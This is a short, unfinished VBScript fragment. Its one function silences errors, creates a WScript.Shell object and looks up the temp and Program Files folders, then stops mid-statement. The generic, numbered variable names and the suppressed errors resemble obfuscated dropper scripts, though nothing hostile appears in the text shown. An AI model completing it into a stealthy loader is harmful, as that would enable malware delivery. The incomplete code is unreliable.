Function GetManifestPart18()
On Error Resume Next
  Dim strCache63,strSync32,strSection35
  Set strCache63=CreateObject("WScript.Shell")
  strSync32=strCache63.ExpandEnvironmentStrings("%TEMP%")
  strSection35=strCache63.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strSync32)>0 And Len(strSection35)>0 Then
